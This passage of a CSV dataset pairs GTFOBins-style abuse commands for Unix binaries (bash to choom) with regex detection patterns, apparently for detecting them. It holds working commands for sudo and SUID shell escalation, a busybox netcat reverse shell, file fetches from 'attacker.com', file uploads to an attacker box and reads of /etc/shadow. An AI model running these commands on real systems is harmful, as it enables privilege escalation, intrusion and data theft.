export LFILE=file_to_get
bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
3<>/dev/tcp/$RHOST/$RPORT \
| { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),Fetch a remote file via HTTP GET request.
bash,file-download,"export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),"Fetch remote file using a TCP connection. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file."
bash,file-write,"export LFILE=file_to_write
bash -c 'echo DATA > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
bash,file-write,"history -c
DATA
history -w $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),This adds timestamps to the output file.
bash,file-read,"export LFILE=file_to_read
bash -c 'echo ""$(<$LFILE)""'",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),It trims trailing newlines and it's not binary-safe.
bash,file-read,"history -r $LFILE
history",(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),The read file content is surrounded by the current history content.
bash,library-load,bash -c 'enable -f ./lib.so x',(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
bash,suid,./bash -p,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
bash,sudo,sudo bash,(?i)(?:sudo\s+)?(?:\S*/)?bash\s+-c\s+.*(?:exec\s+bash|/dev/tcp|>&|<&),
batcat,shell,"batcat --paging always /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
batcat,limited-suid,"./batcat --paging always /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
batcat,sudo,"sudo batcat --paging always /etc/profile
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?batcat\s*\-\-paging\s+(?:/bin/(?:sh|bash))),
bc,file-read,"bc -s $LFILE
quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bc,sudo,"sudo bc -s $LFILE
quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bc,suid,"./bc -s $LFILE
quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bc\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bconsole,shell,"bconsole
@exec /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s+(?:/bin/(?:sh|bash))),
bconsole,sudo,"sudo bconsole
@exec /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s+(?:/bin/(?:sh|bash))),
bconsole,file-read,bconsole -c /etc/shadow,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bconsole\s*\-c\s+.+),"The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files."
bpftrace,sudo,"sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s*\-e\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bpftrace,sudo,"echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
sudo bpftrace $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bpftrace,sudo,sudo bpftrace -c /bin/sh -e 'END {exit()}',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bpftrace\s*\-c\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,file-read,"bridge -b ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,suid,"./bridge -b ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bridge,sudo,"sudo bridge -b ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bridge\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"bundle help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
bundle,shell,"export BUNDLE_GEMFILE=x
bundle exec /bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle exec /bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,shell,"touch $TF/Gemfile
cd $TF
bundle console
system('/bin/sh -c /bin/sh')","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This spawns an interactive shell via [`irb`](/gtfobins/irb/).
bundle,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundle install","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundle,sudo,"sudo bundle help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundle\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
bundler,shell,"bundler help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
bundler,shell,"export BUNDLE_GEMFILE=x
bundler exec /bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler exec /bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,shell,"touch $TF/Gemfile
cd $TF
bundler console
system('/bin/sh -c /bin/sh')","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s*\-c\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This spawns an interactive shell via [`irb`](/gtfobins/irb/).
bundler,shell,"echo 'system(""/bin/sh"")' > $TF/Gemfile
cd $TF
bundler install","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bundler,sudo,"sudo bundler help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bundler\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply."
busctl,shell,"busctl --show-machine
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-show\-machine\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
busctl,shell,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-i\s+(?:/bin/(?:sh|bash))),
busctl,sudo,"sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-i\s+(?:/bin/(?:sh|bash))),
busctl,suid,"./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busctl\s*\-\-address\s*\-p\s*\-i\s+(?:/bin/(?:sh|bash))),
busybox,shell,busybox sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.+),
busybox,file-upload,busybox httpd -f -p $LPORT -h .,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-f\s*\-p\s*\-h\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server.
busybox,file-write,"busybox sh -c 'echo ""DATA"" > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
busybox,file-read,"./busybox cat ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
busybox,suid,./busybox sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.+),It may drop the SUID privileges depending on the compilation flags and the runtime configuration.
busybox,sudo,sudo busybox sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s+.+),
busybox,reverse-shell,busybox nc -e /bin/sh $RHOST $RPORT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?busybox\s*\-e\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -lvp 12345` on the attacker box to receive the shell.
byebug,shell,"echo 'system(""/bin/sh"")' > $TF
byebug $TF
continue","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
byebug,limited-suid,"echo 'system(""/bin/sh"")' > $TF
./byebug $TF
continue","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
byebug,sudo,"echo 'system(""/bin/sh"")' > $TF
sudo byebug $TF
continue","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?byebug\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,file-read,bzip2 -c $LFILE | bzip2 -d,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,suid,./bzip2 -c $LFILE | bzip2 -d,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
bzip2,sudo,sudo bzip2 -c $LFILE | bzip2 -d,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?bzip2\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,file-read,"c89 -x c -E ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c89\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,file-write,c89 -xc /dev/null -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c89\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c89,shell,"c89 -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c89\s+(?:/bin/(?:sh|bash))),
c89,sudo,"sudo c89 -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c89\s+(?:/bin/(?:sh|bash))),
c99,file-read,"c99 -x c -E ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c99\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c99,file-write,c99 -xc /dev/null -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c99\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
c99,shell,"c99 -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c99\s+(?:/bin/(?:sh|bash))),
c99,sudo,"sudo c99 -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?c99\s+(?:/bin/(?:sh|bash))),
cabal,shell,cabal exec -- /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cabal\s+(?:/bin/(?:sh|bash))),
cabal,suid,./cabal exec -- /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cabal\s*\-p\s+(?:/bin/(?:sh|bash))),
cabal,sudo,sudo cabal exec -- /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cabal\s+(?:/bin/(?:sh|bash))),
cancel,file-upload,"cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cancel\s*\-u\s*\-h\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file."
capsh,shell,capsh --,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?capsh\s+.+),
capsh,suid,./capsh --gid=0 --uid=0 --,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?capsh\s*\-\-gid\s*\-\-uid\s+.+),
capsh,sudo,sudo capsh --,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?capsh\s+.+),
cat,file-read,"cat ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cat,suid,"./cat ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cat,sudo,"sudo cat ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cat\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cdist,shell,cdist shell -s /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cdist\s*\-s\s+(?:/bin/(?:sh|bash))),
cdist,sudo,sudo cdist shell -s /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cdist\s*\-s\s+(?:/bin/(?:sh|bash))),
certbot,shell,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?certbot\s*\-n\s*\-d\s*\-\-standalone\s*\-\-dry\-run\s*\-\-agree\-tos\s*\-\-email\s*\-\-logs\-dir\s*\-\-work\-dir\s*\-\-config\-dir\s*\-\-pre\-hook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
certbot,sudo,sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?certbot\s*\-n\s*\-d\s*\-\-standalone\s*\-\-dry\-run\s*\-\-agree\-tos\s*\-\-email\s*\-\-logs\-dir\s*\-\-work\-dir\s*\-\-config\-dir\s*\-\-pre\-hook\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_by_ssh,shell,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_by_ssh\s*\-o\s*\-i\s*\-H\s*\-C\s+(?:/bin/(?:sh|bash))),The shell will only last 10 seconds.
check_by_ssh,sudo,"sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_by_ssh\s*\-o\s*\-i\s*\-H\s*\-C\s+(?:/bin/(?:sh|bash))),The shell will only last 10 seconds.
check_cups,file-read,check_cups --extra-opts=@$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_cups\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_cups,sudo,sudo check_cups --extra-opts=@$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_cups\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_log,file-read,"check_log -F $LFILE -O $OUTPUT
cat $OUTPUT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_log,file-write,check_log -F $INPUT -O $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_log,sudo,sudo check_log -F $INPUT -O $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_memory,file-read,check_memory --extra-opts=@$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_memory\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_memory,sudo,sudo check_memory --extra-opts=@$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_memory\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_raid,file-read,check_raid --extra-opts=@$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_raid\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_raid,sudo,sudo check_raid --extra-opts=@$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_raid\s*\-\-extra\-opts\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_ssl_cert,command,"echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_ssl_cert\s*\-\-curl\-bin\s*\-H\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The host example.net must return a certificate via TLS
check_ssl_cert,sudo,"echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
umask 022
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_ssl_cert\s*\-\-curl\-bin\s*\-H\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The host example.net must return a certificate via TLS
check_statusfile,file-read,check_statusfile $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_statusfile\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
check_statusfile,sudo,sudo check_statusfile $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?check_statusfile\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
chmod,suid,./chmod 6777 $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?chmod\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
chmod,sudo,sudo chmod 6777 $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?chmod\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
choom,shell,choom -n 0 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?choom\s*\-n\s+(?:/bin/(?:sh|bash))),
choom,suid,./choom -n 0 -- /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?choom\s*\-n\s*\-p\s+(?:/bin/(?:sh|bash))),
choom,sudo,sudo choom -n 0 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?choom\s*\-n\s+(?:/bin/(?:sh|bash))),
